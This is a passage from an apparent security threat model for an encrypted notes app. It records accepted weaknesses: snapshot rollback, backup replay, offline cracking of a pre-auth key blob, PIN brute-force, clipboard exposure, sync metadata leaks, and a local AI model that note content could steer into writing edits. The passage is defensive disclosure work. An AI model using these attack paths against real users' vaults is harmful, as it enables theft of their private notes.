- **Local prefs replay.** An attacker with disk-write access can restore prior valid `vault.prefs` snapshots (see `spec/protocol.md` §9.5), reverting Myne-managed user preferences to earlier states. The attack is bounded to prior user choices — no arbitrary state injection is possible because AEAD verification (and the `account_number_hash` AAD binding) still applies. The current preference is visible in the Privacy panel UI on the next view, providing user-side detection. No structural defense in v0.1; a monotonic counter or per-blob freshness token was rejected during the MYND-160 grill because the `vault.meta` forensic-frozen discipline (`spec/protocol.md` §10.6) forecloses extending `vault.meta` to carry the counter, and storing the counter outside `vault.meta` adds a second artifact for marginal gain. **Two-class prefs taxonomy (MYND-121).** Preferences in `vault.prefs` split into two classes with respect to this limitation: (1) **best-effort prefs** (e.g. the screen-capture toggle) which inherit the replay limitation above — a replay merely reverts a user choice; and (2) **code-enforced security envelopes** which do **not** inherit it. The auto-lock timeout is class (2): its enabled flag is a code constant and its effective value is `clamp(pref, …, AUTO_LOCK_CEILING)` resolved in code, so a replayed, deleted, or tampered `vault.prefs` can only make auto-lock *stricter*, never disable it or exceed the ceiling. The A6 guarantee that auto-lock provides therefore does not degrade under local prefs replay.
- **A disk-write adversary can delete a note or roll one back, silently (at-rest; no key material needed).** Nothing in v0.1 binds a note's *revision* or the note *set*. A `.myn` blob's AEAD proves it is that note in that vault (`spec/protocol.md` §6.5), not that it is the current revision, and no artefact commits to the collection of files. Two consequences follow for an attacker with write access to the vault directory — the same A4/A7 capability the `vault.prefs` replay item below already concedes, and no more: **deletion is invisible**, because note enumeration is a directory read with no roster to check against and the derived caches are specified to follow disk (§9.6.4, §9.8.4, §9.17.4 each say a note absent from disk is dropped); and **rollback is turnkey**, because `snapshots/` (§9.1) already holds byte-verbatim earlier copies of the same note, sealed under the same `item_key` with the same identity bytes, so copying one over the live file yields a blob that passes every check the format performs. No plaintext or key material is exposed either way — this is integrity and availability, not confidentiality. Bounded on three axes: the attacker must already be able to write the vault directory (an attacker who can do that can also simply delete it, which is louder but not harder); nothing can be *forged*, only removed or reverted to something the user themselves wrote; and Phase 2's vault head (§9.16) closes the server-side version of the same attack for the families it covers, though it is not an at-rest defence. Accepted for v0.1 under the same posture as the prefs-replay item: closing it means either a freshness field in the per-note AAD — which would break §6.3's rewrite-cheapness and invalidate the published vector corpus — or a signed local roster, a second artefact with its own rollback problem. The nearest existing neighbour is the backup item directly below, which is the whole-vault form of the same thing.
- **Vault backups outlive in-vault security events (whole-vault replay).** The user-initiated backup feature (MYND-58/32/218/56; `spec/protocol.md` §9.11) writes a single `.myne-backup` file containing byte-for-byte ciphertext copies of the vault's files. Because the copies are verbatim, three consequences follow, all strictly larger than the `vault.prefs` replay limitation above. (1) **Restore resurrects permanently-deleted notes.** Cryptographic erase (deleting a note's wrapped `item_key`) holds against disk adversaries (A5) — but a backup taken *before* the delete still carries the note's `.myn` blob with its wrapped key inside, and restoring that backup brings the note back. Erase guarantees apply to the live vault, **not** to user-held backup copies. (2) **Old credential wraps persist.** A backup's embedded `vault.meta` carries the credential wraps as of export time: after a password change, every earlier backup still unlocks with the *old* password, and the never-rotating recovery phrase opens *every* backup of that vault, forever. Users who suspect password compromise must treat pre-change backups as openable by the old password. (3) **The backup file itself is a new at-rest artifact at a user-chosen, possibly removable location** (USB stick, cloud-synced folder) — outside the app-data directory and outside Myne's sight. What it leaks to an observer (A5/A7) is the same class as the live vault directory: member count, per-member sizes, and UUIDv7 creation-time buckets — never titles, tags, folders, content, or user-meaningful timestamps (all inside AEAD). The member table's per-member SHA-256 checksums are **unkeyed**: they exist to detect accidental corruption/truncation honestly at export and restore time and claim **no tamper resistance** — an attacker who modifies a member can recompute them; tamper defense remains per-blob AEAD verification at first unlock, exactly as for the live vault. Accepted for v0.1; UI and website copy must present backups within these bounds (no "tamper-proof", no "safe forever", no leak-free claims). (`decisions.md` 2026-06-10; epic MYND-217.)
- **Server backups bound how long a deleted blob survives (operational durability vs cryptographic erase).** Encrypted off-box backup is a **built-in `myne-server` feature** (`decisions.md` 2026-07-14; MYND-505): when enabled by env, the server drives a bundled restic to snapshot its own store to an off-box target on a short cycle (default 14-day retention) so a disk failure cannot lose users' ciphertext (the local-first product still holds the plaintext on devices, but a server-side loss would force every device to re-push). Hosted and self-host use the **same mechanism** (TB5 parity); enabling it is an operator choice, **off by default**. A backup taken *before* a note/attachment deletion carries that ciphertext until the backup itself ages out, so the *effective* worst-case window a deleted blob survives on the operator's side is `retention-horizon + backup-retention` (≤ horizon + 14 days), not the horizon alone. This is bounded (short-cycle, pruned), encrypted (restic repository key held by the operator; the server still cannot read the blobs — this changes retention duration, not confidentiality), and disclosed (here + `self-host-policy.md` §3). It is strictly smaller than the user-held `.myne-backup` case below (which has no bound and no operator control). **Two operational facts the built-in feature introduces:** (a) an enabled server makes **outbound network connections** to the backup target — a new egress from an otherwise inbound-only blind store, carrying only restic-encrypted data; and (b) the **restic repository key + destination credentials** are a new **operator-held secret** — defense-in-depth over already-client-encrypted blobs, so a compromise widens the retention/durability exposure of ciphertext, never plaintext confidentiality, and the zero-knowledge root is untouched. A self-host operator who backs up inherits the same window and the same disclosure obligation. Accepted; marketing/limits copy must not claim "deleted is instantly gone server-side" — it is gone within the disclosed window. (`decisions.md` 2026-07-13 + 2026-07-14; MYND-496/505.)
- **Operator console is a local admin surface, not a new observation channel (MYND-506).** The operator drives account enforcement — view, freeze, per-account quota/device overrides, and irreversible delete — through an admin API bound to a **local Unix domain socket** (`MYNE_ADMIN_SOCKET`; no bearer secret — access is filesystem permissions, i.e. whoever can `docker exec` / is root on the box) plus a `myne-server admin` CLI. It adds **no boundary expansion**: the operator already has full filesystem access to the store (TB5/TB6), so the socket is a convenience interface over enforcement state the operator could already edit by hand; it is local-only, never a TCP port or the public edge (the metrics-endpoint discipline). The enforcement state lives in a sparse server-side plaintext `accounts.json` of the same class as the already-visible device count / stored-byte size (AS16/AS17) — never user content, never a new secret. The console is a **projection of already-persisted enforcement state only** — no request history, no last-seen wall-clocks, no per-account time series (the MYND-440 aggregate-only invariant). The client-facing `GET /account/status` is authed and **token-derived**: the account is resolved from the device token, never from the URL or query, so the account number never appears in a request line or log (network observers cannot read the TLS-encrypted path in any case — this is the belt-and-suspenders rule). (`decisions.md` 2026-07-15; MYND-506.)
- **`GET /vault.meta` is pre-auth, so an account number is sufficient to obtain the offline-attack target.** A joining device must fetch `vault.meta` *before* it can authenticate, and this is not an oversight to be closed: the SCRAM secret is `DeriveSubkey(root_key, "server-auth")` and `root_key` cannot be derived without that blob's salts, so requiring a session would be circular — and would break the two flows that have no second device, fresh-machine recovery from account number + 24 words, and the web client. The route is therefore session-less by design (`spec/server-protocol.md` §3.1). What was not recorded until now is its consequence. The 345 bytes it returns are the complete offline password-cracking target: the Argon2id salt, the cost parameters, and both wrapped `root_key` copies. So the party who can mount an offline attack on the master password is not only the disk-holder (A5) or the operator (A1) but **anyone who has ever learned the account number**, from anywhere, with no device and no server access. That class has no row in §1, and this is the entry that records it rather than inventing one. The defence is entirely password strength × the Argon2id cost of §4.1; the recovery-phrase copy in the same blob is not a weakness, since 256 bits of entropy is not guessable. **Two consequences worth stating because they are easy to get wrong.** First, this settles a contradiction between two normative documents: `spec/account-number.md` §7 says to treat account numbers like cash and not to display them in shared screenshots, while §1 A15's device-join note calls the number "an identity, not a secret". The account-number document is right, and the QR bullet's wording is the loose one. Second, the ~3-minute TTL that bullet relies on bounds the **join**, not this: the number inside a photographed QR never expires, and this route has no TTL, no nonce and no enrollment window. Accepted for v0.1, with the password-strength floor at signup (`spec/protocol.md` §4.1) as the control that actually carries it.
- **Quick-unlock is an A6 gate, not an A7/A5 defense.** PIN / biometric quick-unlock (MYND-329; `spec/protocol.md` §9.14) stores a third wrapped copy of `root_key` in the device-local `vault.quickunlock` blob so a re-lock can be reversed with Touch ID / Windows Hello / a PIN instead of the full master password. It is layered **over** the already-encrypted store and never weakens the zero-knowledge root: the master-password Argon2id path is unchanged and remains the primary credential, and the wrap key is bound to OS hardware (macOS Keychain item gated by `kSecAccessControlBiometryCurrentSet` + `thisDeviceOnly`), never stored in a plain credential store readable by other local processes (the Bitwarden CVE-2023-27706 failure mode is structurally avoided). Its guarantee is bounded to **A6** (brief physical access to a running-but-locked app, shoulder-surf): a convenience gate. It does **not** defend against **A7** (active local malware can satisfy the biometric prompt or read the unwrapped `root_key` from process memory — already out of scope, §5). For the **PIN** provider specifically, a disk-copy attacker (**A5**, or **A7** for a live read) can attempt **offline brute-force** of the blob; the only defense is PIN entropy × the memory-hard Argon2id cost (min 6 digits; the vault's `m=256 MiB` baseline), so PIN-only quick-unlock is **strictly weaker** than the hardware-bound biometric path. A code-enforced failed-attempt counter (the two-class auto-lock discipline above) bounds *online* guessing only, and biometric-set changes invalidate the credential at the OS level (`biometryCurrentSet`). UI and website copy must present quick-unlock within these bounds — a faster re-entry to an already-encrypted vault, not a second wall against malware. (`decisions.md` 2026-06-16.)

- **The Apple Watch companion is outside the plaintext trust boundary (like the home-screen widget).** The watch voice-quick-capture app (`decisions.md` 2026-07-12) holds NO vault key material and runs no crypto — it dictates note text and relays it to the phone over WatchConnectivity. The not-yet-committed capture is held on the phone in a **device-local encrypted queue** (AS18; `MYK1`, `spec/protocol.md` §9.18) sealed under a device-local keychain key (`kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly`, non-biometric) that is **not** `root_key`-derived — so it survives while the vault is locked and drains into whichever vault unlocks first, via the audited `note_create` path. The zero-knowledge server boundary (TB5) is untouched: the queue is never synced or backed up, and the server never sees a capture. **Two transient plaintext carve-outs, accepted:** the watch's WatchConnectivity outbox and the phone's staging file (written by the native receiver before the Rust seal) hold the dictated text as plaintext protected only by OS Data Protection — short-lived, never containing existing vault content, and (on the watch) unavoidable without putting key material on a device deliberately kept key-free. This is a new ingress and a new device holding transient user text, bounded to **A6/A7** on the two devices the user already controls; it is never a server-visible or cross-vault leak. (`decisions.md` 2026-07-12.)

- **The OS share sheet is a new ingress, bounded like the microphone and the watch queue.** Registering Myne as a share target (`decisions.md` 2026-07-16; iOS Share Extension / Android `ACTION_SEND`) lets a file be shared into Myne from an arbitrary sending app while the vault may be locked. The file is held in a **device-local encrypted queue** (AS19; `MYF1`, `spec/protocol.md` §9.20) sealed under a device-local keychain/Keystore key that is **not** `root_key`-derived — so it survives while the vault is locked and drains into whichever vault unlocks first, via the audited `attachment_import` path (which re-sniffs the content type authoritatively; unrecognized types store as `application/octet-stream`, served export-only). The zero-knowledge server boundary (TB5) is untouched: the queue is never synced or backed up, and the server never sees a pending share. **Plaintext staging carve-out, accepted (the §9.18.4 watch-staging pattern):** before the seal, the shared bytes exist as plaintext protected only by OS Data Protection — **on iOS a persistent staging file** the Share Extension writes into the App-Group container (bytes + `.meta` sidecar, `.completeFileProtection`, sealed and deleted by the app on next open, because linking the crypto into the extension is infeasible — see `decisions.md` 2026-07-16); **on Android a RAM + WebView-transit transient** (the `content://` stream read into RAM and base64'd across the WebView before `seal_share`). Both are device-local, contain only the just-shared file (never existing vault content), and live in the app's own container. The **arbitrary-sender ingress** is the same shape as the microphone note (AS7): the bytes are attacker-influenceable, so they are treated as untrusted content, re-sniffed, and never executed. Bounded to **A6/A7** on the device the user already controls; never a server-visible or cross-vault leak. (`decisions.md` 2026-07-16.)
- **The `myne://` URL scheme is a new ingress, bounded by an explicit confirmation.** Registering the desktop app as the handler for `myne://` (`decisions.md` 2026-07-25; MYND-567) lets **any website** hand the app a `myne://theme/install?…` URL carrying a base64url custom-theme palette. Three consequences, recorded rather than assumed away. (1) **Any page can launch or raise the app** — a nuisance-class capability (A6-adjacent), not a data one; the OS, not Myne, decides that a registered scheme resolves. (2) **Attacker-chosen bytes are parsed in the WebView while the vault may be locked** — the subscription is installed at boot, so a URL arriving pre-unlock is parsed and held in a page-memory latch. The latch is never written to disk, never leaves the process, and holds only what the URL carried (never existing vault content); a quit at the unlock screen discards it. Parsing is bounded before it starts: a decoded-payload cap (16 KiB), a name cap (64 chars), fatal-mode UTF-8 decoding, and control/bidi stripping on every string that will be displayed. (3) **The payload is never dereferenced.** The palette rides *inside* the URL rather than behind one because this module never dereferences a URL it is handed, and the WebView that parses it is bound by the CSP `connect-src` allowlist (`src-tauri/src/no_egress.rs` additionally keeps third-party HTTP-client crates out of the shipped tree; what that gate does and does not prove is stated in the local-AI bullet below); an accompanying `src=` is displayed provenance only, is never fetched, and is dropped unless it is `http(s)`. The **write path is unchanged**: a deep-linked palette is sealed by the same `themes_import` command as a hand-imported file, so the host-side value-shape allowlist above remains the primary control and runs before anything reaches `vault.themes`. The **confirmation dialog is the gate** — a deep-linked theme is never applied without an explicit user Apply, and the pre-Apply palette preview paints only values matching a strictly-narrower display-safe colour subset, so the allowlist is not bypassed by the act of previewing. Bounded to **A6/A7** on the device the user already controls; TB5 is untouched (the server never sees a theme install), and no new key, blob, magic, or AAD role is introduced. (`decisions.md` 2026-07-25.)

- **Vault head (Phase 2 sync) hardens against a malicious server, with five honest limits.** The vault-head fork-consistency primitive (MYND-416; `spec/sync-protocol.md`, with the `MYH1` baseline at `spec/protocol.md` §9.16) defends multi-device sync against an untrusted server (TB5; A1, A13-adjacent) that cannot read or forge content but can still **rollback** (serve an authentic-but-old head/blob), **withhold**, or **equivocate/fork** (show devices divergent histories). It is HMAC-monotonic and hash-chained; the server, lacking `root_key`, cannot forge a head, only replay/withhold/reorder/equivocate over real ones. The guarantees it does **not** make, recorded so marketing/UI cannot exceed them:
  - **(1) TOFU bootstrap.** A device with no persisted baseline (fresh / reset / re-enrolled) cannot detect rollback or fork on its *first* adopted head — VV-dominance is a continuity guarantee, not a bootstrap one (SUNDR: a client that has observed nothing detects nothing). A malicious server can seat a new device onto a stale or forked history undetectably. The only mitigation is an out-of-band **bootstrap-fingerprint** eye-compared at the device-approval gate (Signal/Matrix safety-number model); the substrate ships in v1, the general always-on fork-audit fingerprint UI is v1.x.

    **What that compare's honesty now rests on, and what it does not close (myne-md/myne#462).** A head is not a stable identity, so the two screens sampled at different moments disagreed for reasons that were not attacks, and the fix is a client-side **push hold**: while a verify screen is open the client authors no content head, and pulls continue. The hold is bounded so a client that dies mid-compare cannot strand its own edits: a 15 s lease renewed by the open screen, and a 5-minute ceiling renewal cannot pass. That means the compare's stability is now a lease-bounded client property rather than a protocol one. Four residuals are stated rather than implied. **(a)** A malicious server can keep the head moving deliberately to manufacture mismatches, which is the alarm-fatigue attack aimed squarely at the one mitigation this row names, and nothing here closes it. **(b)** The hold reaches only the two participating devices, so a THIRD device pushing mid-ceremony still moves the head. **(c)** A re-key rebase authors a head through the hold by design (#429), because not rebasing wedges the device. **(d)** A moved head is announced rather than swapped in silently, so the compare stays a comparison rather than a convergence wait, but that announcement is user attention rather than a structural property. On desktop the mismatch action is a confirmation rather than an immediate removal, matching mobile and every other removal on that panel, so a user who cancels leaves the unverified device enrolled.
  - **(2) Withholding is split.** Withholding of a device's **own** authored work is caught in-band (its version-vector self-component must not regress). Withholding of **other** devices' work, and global staleness (hiding the newest head while serving an older-but-not-rolled-back one), is **best-effort** — the client cannot distinguish "nothing new" from "withheld"; a signed freshness-box is iceboxed. Copy must not claim withholding is detectable in general.
  - **(3) Local-baseline rollback is a conjunction, accepted.** The device-local `MYH1` baseline is authenticated by the head's own MAC but **not** freshness-protected: an attacker who can both **write the local disk (A4/A7) and collude with a malicious server (A1)** can swap it for an older genuine head to force acceptance of a server rollback. Neither capability alone suffices; impact is bounded to stale **own** data (never forged or decrypted) and the in-session RAM baseline is monotone. Accepted for v0.1; a hardware monotonic counter (TPM / Secure Enclave) is the next major version's closure.
  - **(4) No forward secrecy.** `root_key` compromise is total compromise — the symmetric head MAC (HMAC, not a signature) gives no forward-secret revocation; a removed/compromised device's historical access is not cryptographically revoked. This matches the v0.1 single-`itemsKey` posture (§5 / `spec/protocol.md` §11); real per-device forward-secret revocation is an iceboxed/MLS epoch-key feature.
  - **(5) Manifest scope is content blobs only.** The head commits `uuid → content_nonce` for **notes + attachments** only; synced singletons (`vault.prefs`, `vault.meta`, dictionary, catalog) are **not** covered, so their rollback remains the already-accepted "local prefs replay" limitation above (and `vault.meta`'s bespoke-merge + `root_key`-invariant keep a credential-rollback low-impact). This is deliberate, not an oversight.
  The head adds **no new plaintext metadata** to what the server already sees (manifest `content_nonce`s are cleartext headers; per-device version-vector counters are device-count — already AS16 — plus per-device push timing — already the "sync timing leaks usage patterns" item above). *(Sequencing: the broader Phase 2 sync §7 amendment is MYND-414's; this rider records only the vault-head-specific deltas. `decisions.md` entry to be added with MYND-416.)*
- **Per-device sync token is an availability credential, tiered by storage (MYND-458/425).** The Phase 2 per-device token (issued at SCRAM enrollment, `spec/server-protocol.md` §3.1) is an **availability** credential (SYNC-2): device-local, never synced, and **never a confidentiality gate** — it authorizes a device to sync, it does not wrap or unlock vault contents. Revoking it stops that device syncing but cannot lock a device that already holds `root_key` (the honest-disclosure `REMOVE_DEVICE_DISCLOSURE`); the vault's at-rest secret (A5) is strong independent of the token. Storage is **tiered**: v1 mobile is an **app-sandbox file** (per-app isolated on iOS) and desktop the shared `0600`-file default; OS-keychain `thisDeviceOnly` hardening is deferred (MYND-464 mobile / MYND-463 desktop) as **defense-in-depth, not a confidentiality prerequisite**. Because mobile v1 does no background sync, the token need not be readable while locked, so the stricter `WhenUnlockedThisDeviceOnly` accessibility class is available (MYND-460, SYNC-37). (`decisions.md` 2026-07-07.)
- **Device-join via QR — a secret-free enrollment entry point (MYND-466).** The trusted desktop can display a QR a phone scans to join, prefilling `{server_url, account#}` in place of manual typing; the phone still enters its own password (SYNC-47 — the QR **never** carries a secret). The account number is the **AS9 bearer token** (an identity, not a secret) and is **not newly persisted** — the desktop obtains it from a **one-time user paste** (`account-number.md §9` — the user is the one who holds the number; per `§7` the raw form never crosses the wire, and no at-rest copy is introduced). The QR is a **new enrollment entry point**, not a new adversary or asset: it is covered by the existing enrollment/MITM surface (A4) + TB5. Two model-relevant points: **(1)** for a self-host endpoint the scan **replaces the SYNC-26 out-of-band cert-fingerprint eye-compare** — scanning the trusted device's own screen *is* the out-of-band channel, and an **ephemeral TTL** (≈3 min) enforces live co-presence so a photographed/relayed QR is stale; the SAS head-fingerprint code-match (SYNC-40) still runs post-approval, unchanged. **(2)** a tampered/swapped QR is **ZK-neutralized**: it can only point the phone at a foreign account#/server, which the user's password cannot unlock (wrong `root_key` → AEAD-fail) — the worst case is a *failed* join, not a vault compromise. **Open (R1):** the "scan replaces the eye-compare" substitution warrants a **primitive-level** review before ship, not just an architectural one; and **strict cert-pin-match at join** (verifying the connected cert against the QR's carried `cert_pin` inside `sync_join_account`, not only surfacing the pin source on the confirm screen) is a tracked follow-up — until it lands the endpoint TOFUs and this ZK argument is the backstop. Scanner: a custom AVFoundation Tauri plugin (iOS-only, SYNC-46; Android MYND-465), camera gated by `NSCameraUsageDescription` + the deny-by-default `qr-scan:default` capability (TB6). (`decisions.md` 2026-07-19 "Device-join via QR".)
- **Mobile clipboard, the capability set EXPANDS by three commands, and one of them is a read (myne-md/myne#390 + myne-md/myne#455).** The mobile client's clipboard moves to an in-repo `sensitive-clipboard` plugin granted through `capabilities/default.json` (TB2, the Tauri ACL). Stated in the direction that matters: the client goes from **zero** granted clipboard commands to **three** (two writes, one read). Removing the phantom `@tauri-apps/plugin-clipboard-manager` npm entry alongside it is a dead-code cleanup and subtracts no capability, because that plugin was declared and never registered, no Cargo dependency, no `.plugin()` call, no grant, so every call through it rejected at runtime and the account-number Copy had never worked on any device. **(1) A secret write asks the OS to hold it, and that request is DOCUMENTED BUT NOT YET OBSERVED.** On iOS the item is written with `.localOnly` and `.expirationDate` together: the first is intended to keep a copied secret off Universal Clipboard, the second to have the OS drop it after 30 s, surviving app termination where a JavaScript timer does not. The two are a pair, with confinement off the expiry does not reliably reach Universal Clipboard, and the Swift side has no path that sets one without the other. **This behaviour has been read in Apple's documentation and never measured on hardware**, so it is recorded here the way TB11's unimplemented service worker is: as an intent, not a guarantee. The affordance that depends on it (the recovery-phrase Copy) is held OFF in code until `docs/dev/clipboard-sensitivity-verification.md`'s checks pass. On the strength of the intent alone, `recovery-flow.md` §2.2's read-compare-clear is superseded **on mobile only**; that supersession is provisional on the same checks. **(2) The clipboard READ is granted on mobile and on mobile alone.** `src/platform/clipboardManager.ts` still exports a write and nothing else, so desktop and web keep myne#379's posture and render no Paste affordance; the mobile grant exists for the recovery-phrase Paste and is user-initiated per call. On iOS 16 and later the OS adds its own "Allow Paste?" prompt; **on iOS 13 to 15 and on Android there is no such prompt and the grant is standing for the life of the process.** The accepted residual is that on the tap the app sees whatever the user last copied, plausibly a password from their manager; the value goes into the phrase fields and is never logged or persisted. **(3) An ORDINARY content copy is unconfined, by decision.** A note body, a wikilink or a code block is written with neither option, so on iOS it may reach the user's nearby Apple devices through Universal Clipboard, which is usually what someone copying a note wants, and is why the tier exists. Named here because it is decrypted note plaintext (AS1) leaving the device by a channel no other row describes. **(4) Android is weaker and the product reflects it rather than papering over it.** `ClipDescription.EXTRA_IS_SENSITIVE` is a rendering hint, it redacts the paste preview, it does not stop a clipboard manager reading the value, and Android offers no confinement and no per-item expiry at any version. The recovery-phrase Copy is therefore withheld on **every** Android version, not gated to a recent one. The account number is still offered there, cleared by an app-scheduled timer on every API level (including 33+, where the OS's own auto-clear is an hour-scale backstop rather than the 30 s envelope). **That Android clear is UNCONDITIONAL**, and the difference from every other clear here is worth stating: desktop compares before clearing and iOS expires the item itself, so neither can touch a later copy, while the Android arm wipes whatever is on the clipboard when the timer fires. A user who copies something else inside the 30 s window loses it, and what they lost may itself be a credential pasted from a manager. It is an availability cost against arbitrary user content rather than a confidentiality one, and it is the one arm of this feature that does the thing `recovery-flow.md` §2.2 raises the read-precondition specifically to avoid. Known limit, recorded rather than fixed here: `minSdk = 24`, so on API 24 to 28 a background app can read the foreground clipboard at all; raising the floor to 29 would close that and is a product decision out of this change's scope. (`decisions.md` 2026-08-15, four entries.)
- **Phase 2 sync metadata — accepted leaks and limits (broad amendment, MYND-414).** The sync wire protocol (`spec/sync-protocol.md` §8–§11) over the untrusted server (TB5; A1, A13) exposes metadata beyond the one-shot at-rest signal, all **accepted for v0.1** and recorded so claims do not exceed the model:
  - **Longitudinal push/pull timing (new).** At rest, blob mtime is a one-shot snapshot; sync gives the server a **continuous, over-time activity profile** (when each device pushes/pulls). This is strictly more than the existing "Sync timing leaks usage patterns" bullet (which is the *version-counter increment* signal) — it is the same class, extended to the full session timeline. The v1 mitigation is **coalesced write cadence** on the wire (don't flush every keystroke; coalesce pushes ~5 min) — which *blurs resolution, it does not decorrelate*; jitter / constant-time push is a later-version item. Polling-baseline (§8.3) gives partial decorrelation for free (changes surface to other devices at poll cadence, not push instant). *(Amended 2026-07-12: with the poke stream now baseline — next bullet — a remote device's pull typically follows a push within seconds; but that pull is triggered by an event the server itself relayed to the same account's devices, so it discloses nothing the push had not already disclosed, and the polling fallback still bounds the stream-down path.)*
  - **Always-on contentless poke stream (amendment 2026-07-12 — supersedes the opt-in-SSE posture).** The §8.3 SSE poke was originally opt-in because an open stream is a continuous presence signal. Amended: clients keep the stream open whenever the vault is unlocked (mobile: and foregrounded). The added disclosure over the polling baseline is **presence granularity only** — poll-granular ("a request every interval while unlocked") sharpens to connection-granular ("session start/end at second resolution") — never content, and never a new identifier: the poke stays literally zero-payload and the stream is bound to the same per-device session the polls already authenticate. The granularity delta was judged too small to justify a user-facing privacy toggle whose protective value was largely theatrical (the polling it "fell back" to disclosed presence anyway); a device that must not disclose presence at all must stay offline, with or without the stream. Edge-triggered one-shot pulls (unlock / focus / foreground) sharpen the session-boundary signal the same bounded way and are rate-limited by construction.
  - **Per-device version-vector (new).** The vault head's VV (`sync-protocol.md` §4.1) is server-relayed, so the server sees **how many devices exist and each device's push count over time**. Device count is already AS16; per-device push-timing is A13. No note content; structural only.
  - **Blob size / count / version-counter / UUIDv7 creation-time.** Unchanged in class from the existing "blob size leaks information" + "sync timing" bullets — sync makes them observable to the server (TB5) rather than only an at-rest disk observer (A5). No padding in v1 (size is an object property; real mitigation is holistic at-rest+wire padding = a next major version change, not a sync patch).
  - **Deletion events are server-visible as structural markers (MYND-468).** A note deletion is a tombstone-flagged push record (`sync-protocol.md` §11.1) and an attachment deletion is the same tombstone shape on the attachment's sync-id (`sync-protocol.md` §11.4) — so the server sees *that* some opaque blob-id reached end-of-life and coarsely *when* (the push's arrival), for notes and attachments alike. It never sees the "deleted" **meaning**, the filename, or the content (AS6 holds: the marker is structural lifecycle, not semantics — the same class as the version-counter increment). Any reclamation design requires this signal (the server cannot read the manifest, and without an explicit marker the §6 "do not retain deleted ciphertext past the horizon" operator obligation would be unenforceable). Accepted for v0.1.
  - **Payment-as-deanonymization (placement).** When hosted sync is paid, the payment processor + sync server *together* could correlate "person ↔ `account_number_hash` ↔ AS14–17 metadata" — a **pseudonymity** loss, never a confidentiality one (zero-knowledge over content holds). This sits **outside the sync trust boundary** (a token-decoupled subsystem; anonymous rails + token-decoupling are the mitigation) and is hosted-only. The payment system itself is MYND-430; only its threat-model *placement* is recorded here.

- **Browser-clipper channel (TB10 / A14).** The keyless clipper extension (`browser-extension` epic, MYND-442) adds a browser↔desktop native-messaging boundary (TB10) and a new adversary (A14, compromised-extension-build, 🔒 Mitigated). Residual: a compromised build can write attacker-chosen clip notes — render-safe, append-only, visible, deletable; never read/decrypt/delete/exfiltrate. Clips save to the vault root and carry no folder/tag selection, so no vault structure (AS3/AS5) ever transits the browser; the extension holds no plaintext at rest (no pending-queue — capture requires the vault unlocked). Opening a bookmark's source URL is an explicit-gesture external egress, like existing autolinks.   - **AI egress: what the dependency gate proves, and what now crosses by design (amended 2026-08-09).** The AI stack (Candle + tokenizers) is added with `default-features = false`, which keeps the `hf-hub` / `http` model-download crate families **out of the dependency tree**. Because AI is no longer a feature-delta, a CI gate (`src-tauri/scripts/ai-no-network-check.sh` + `src-tauri/src/no_egress.rs`) scans the single shipped tree and proves the property it states about itself: **no denylisted HTTP-client, model-download, socket-opening or telemetry crate is present, except the documented sync-TLS allowlist** — `rustls`, `rustls-pki-types` and `rustls-webpki`, which are sans-io transport primitives rather than HTTP clients, are not AI dependencies, and are not reachable from the AI path (a denylist scan, plus the single-`Cargo.lock` / no-wildcard TB9 checks). The property is now *no byte leaves the device unless the user has named a provider*: every provider setting defaults to unset, and unset means the path is **unreachable**, not merely disabled. **Read "the user" at ACCOUNT scope, not device scope**, and the difference is not pedantic: the provider selection, its key and the consent record are vault content and therefore **sync** (`sync-protocol.md` §10.2; ledger SYNC-15/SYNC-22), so a newly enrolled device inherits them and begins sending without anyone at *that* device having seen the consent screen. One person approving once for their own account is the intent; the residual is that the approval is not re-asked per device, and it is stated here rather than left for a reader to discover from the classification table. That is enforced by a **default state plus a call-site ratchet** — an explicit, per-file, reason-carrying allowlist of source locations permitted to open a socket on the AI path, landing empty — because the crate denylist is destination-blind and cannot express it. Nothing the denylist *does* prove has changed. This closes **designed** exfiltration — a model-download or telemetry SDK phoning home — which is the dominant AI threat. It does **not** close **compromised-runtime** exfiltration, and no crate-name denylist could: the Phase-2 sync client is a first-party HTTP/1.1-over-TLS transport compiled unconditionally into the same process (`core/src/plugins/sync/`), and `std::net` is reachable from any code running inside a Rust binary regardless of its dependency graph. That case is **A7**, already outside the process-integrity boundary per §5, and is exactly the in-process residual the next bullet records.

A malicious model or a Candle vulnerability could therefore read vault RAM (**A7-class** — already outside the v0.1 process-integrity boundary, TB2/§5). The desktop **bundled default** transcription model (MYND-270; `decisions.md` 2026-07-19 "Bundle a default transcription model on desktop") is a **first-party** asset Myne *does* vouch for — provenance-pinned (Git LFS + reproducible build), Apache-2.0 — so for the default user who never overrides it the A6/A14 *side-loaded-model* supply-chain surface does not apply; a user-picked override re-enters the untrusted-input case above. **The auto-tag task-model (MYND-651; `decisions.md` 2026-07-31 "Auto-tag runs on a bundled task-model and renders inline") is the same shape and adds no new axis**: a second first-party bundled GGUF, provenance-pinned the same way, loaded through the *same* Candle/Qwen2 path as the generation role — no new runtime, no new networked crate (the no-egress denylist gate above still proves the absolute property of the shipped tree), and **no override picker**, so it never re-enters the untrusted-input case at all. The planned mitigation for the in-process residual itself is a **sandboxed sidecar** (SYNC-6): the model runtime moves to a separate, network-denied, keyless process that receives only prompt/embedding plaintext over IPC — `root_key` and the crypto core never cross the boundary. That isolation is **still deferred**; SYNC-6 explicitly permits the in-host engine as the first iteration for the experimental beta. **Conflict recorded 2026-08-09, not resolved:** that plan specifies a *flat* network deny (macOS `sandbox-exec` denying `network*`, Linux an empty network namespace), and a local model runtime reached over loopback (TB12) needs a carve-out from exactly that deny. Designing that carve-out is separate work; naming the contradiction here keeps the sidecar from being implemented against a spec it would have to violate. **Marketing/UI must not claim model-runtime isolation until the sidecar lands** — today the correct claim is "runs locally, sends nothing" (true), not "sandboxed from your keys" (not yet), and Developer mode itself must not be described as a security boundary until its host-side half ships.

What is new, and is the disclosure: the model learns the FOLDER NAMES of out-of-scope matches and how many of the ranked matches fell in each. Two boundaries do not move. And the counts describe the matches the search ranked rather than the vault, which the model is told, so a folder's number is not a vault total and must not be reported as one. **Restated again 2026-08-21 (myne-md/myne#551):** the explicit user action now has **two** forms, and the second is starting a run while the automatic-apply mode is on. The third is the mode's own lifetime: it is **session-scoped**, never persisted, and dropped by the same lock and vault-switch teardown that drops the run, so a choice made for one vault cannot write into the next. What this does change is real and is stated rather than softened: inside an approved scope, a model steered by note content can now write without a second act, and the compensating controls are the scope, the removal carve-out, the pre-write snapshot every edit already takes, and the undo offer that outlives the run. Its output is AS1-class RAM like the rest of the surface (suggestions and their content-hash cache are never persisted), and SYNC-17 holds: a suggested tag reaches the note only through the user's explicit accept, written via the normal `note_save`/`MY01` path. **Voice-to-text is a documented explicit-action carve-out on 